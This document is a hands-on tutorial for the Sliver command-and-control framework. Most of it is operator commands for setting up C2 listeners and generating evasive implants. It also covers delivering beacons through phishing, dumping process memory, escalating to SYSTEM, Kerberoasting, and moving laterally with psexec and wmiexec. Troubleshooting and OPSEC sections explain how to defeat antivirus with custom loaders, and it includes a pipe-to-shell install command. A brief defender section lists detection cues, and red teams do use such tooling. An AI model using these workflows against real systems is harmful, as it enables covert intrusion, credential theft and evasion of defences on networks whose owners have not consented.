# Sliver — full tutorial

Sliver is the open-source, modern C2. Written in Go (single binary, cross-compile for everything), supports HTTP/HTTPS, mTLS, DNS, WireGuard, and MTLS over named-pipe. Maintained by Bishop Fox.

## Install

```terminal
curl https://sliver.sh/install | sudo bash
sliver-server daemon &
sliver
```

Operator client connects with imported config:

```terminal
sliver-server operator -n op1 --lhost team.internal --save op1.cfg
sliver-client import op1.cfg
sliver-client
```

## Listeners

```
sliver > https --lhost 0.0.0.0 --lport 443 --domain c2.example.com
sliver > http  --lhost 0.0.0.0 --lport 80
sliver > mtls  --lport 8443
sliver > dns   --domains a.example.com b.example.com
sliver > wg    --lport 53
```

`mtls` is mutual TLS — operator-only auth, very stealthy when paired with a CDN front.

## Implant generation

```
sliver > generate beacon \
    --http "https://c2.example.com" \
    --jitter 30 --seconds 60 \
    --os windows --arch amd64 \
    --format exe --save /tmp/agent.exe \
    --evasion --skip-symbols
```

Formats: `exe`, `shared` (DLL), `service`, `shellcode`, `elf`, `macho`. Generation supports stage encryption + reflective DLL.

## Sessions vs beacons

| Type | Network model |
|------|---------------|
| **Session** | Persistent connection — instant interactivity but obvious |
| **Beacon** | Periodic check-in — stealthy, slower |

```
sliver > sessions
sliver > beacons
sliver > use <id>
sliver (TARGET) > getuid
sliver (TARGET) > info
```

## Operator commands inside an implant

| Command | Effect |
|---------|--------|
| `getuid / whoami` | Identity |
| `pwd / cd / ls / cat` | FS |
| `download / upload` | File transfer |
| `shell` | Native cmd/PowerShell/bash |
| `execute / execute-assembly` | EXE / .NET assembly in-memory |
| `procdump <pid>` | Dump process memory |
| `getsystem` | SYSTEM via token |
| `impersonate / make-token` | Token impersonation |
| `migrate <pid>` | Move to different process |
| `psexec / wmiexec / dcomexec` | Lateral movement |
| `portfwd / rportfwd` | Port forwarding |
| `socks5 start` | SOCKS5 through implant |
| `armory` | Plugin store (BOFs, .NET tools) |
| `jobs` | Listener / handler tracking |

## Armory — plugin / extension store

```
sliver > armory install
sliver > armory install certify
sliver > armory install rubeus
sliver > certify find -vulnerable
sliver > rubeus -- kerberoast
```

Armory hosts community-curated BOFs and .NET assemblies wired up as Sliver commands.

## Profiles & Stagers

```
sliver > profiles new beacon \
    --http "https://c2.example.com" --os windows --arch amd64 \
    --jitter 60 --seconds 300 --debug-file=false stealth-https
sliver > stager --listener-url tcp://0.0.0.0:8443 --output stager.bin --format raw
```

Stager produces shellcode you can wrap in a loader (donut + custom decryptor).

## Workflows

### HTTPS beacon end-to-end

```
sliver > https --domain c2.example.com --lhost 0.0.0.0 --lport 443 \
    --letsencrypt --persistent
sliver > generate beacon --http https://c2.example.com --jitter 25 --seconds 60 \
    --os windows --arch amd64 --format exe --save beacon.exe --evasion
# Deliver beacon.exe via phishing chain.
sliver > beacons
sliver > use 0
sliver (BEACON) > tasks
```

### Lateral movement

```
sliver (B1) > psexec --hostname FILESRV --service-name update --service-description "Updates"  beacon-x64.exe
sliver (B1) > wmiexec --hostname WEB01 --command "powershell -ec ..."
```

### SOCKS proxy → use external tools

```
sliver (B) > socks5 start
# operator side: proxychains4 nmap -sT -Pn 10.0.0.0/24
```

### Port-forward RDP through beacon

```
sliver (B) > portfwd add --bind 127.0.0.1:13389 --remote 10.0.0.5:3389
# operator: xfreerdp /v:127.0.0.1:13389 ...
```

## Bad output and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| Beacon never checks in | Egress / TLS issue | Test with `curl https://c2.example.com` from victim; check redirector logs |
| `--evasion` build still detected by AV | Default Sliver shellcode signatures | Wrap with custom loader (donut, ScareCrow); use private fork |
| Letsencrypt fails | Port 80 unreachable for HTTP-01 | Use DNS-01 challenge or pre-issue cert |
| BOF crashes beacon | BOF API mismatch | Try the matching Sliver version; rebuild BOF with current SDK |

## Defender's perspective

- Sliver default HTTPS beacon JA3 / JA3S is documented; you can fingerprint it.
- Default beacon URIs (random GUID-style paths) — distinctive without a profile.
- Implant binaries packed with garble (default `--evasion`) leave Go-runtime strings — Yara rules exist (`malware-yara/sliver_implant.yar`).

Detection wins:
- ETW-based EDR catches reflective loading + Go runtime symbols.
- Network anomaly: TLS to a Let's Encrypt cert with newly-registered domain.

## OPSEC

- Generate per-engagement implants; Sliver embeds a build ID that ties multiple binaries together.
- Use armory wisely — every BOF you import has signatures of its own.
- Maintain operator config files in encrypted volume; they grant team-server access.
- Replace default Sliver shellcode with a custom loader for any environment with vendor EDR.

## Related tools

- **Cobalt Strike** — commercial alternative.
- **Mythic** — modular OSS framework (swap agents like LEGO).
- **Havoc** — modern OSS, Yaegi-scriptable.
- **Brute Ratel** — commercial, less-signatured.
- **Merlin** — HTTP/2 OSS C2.
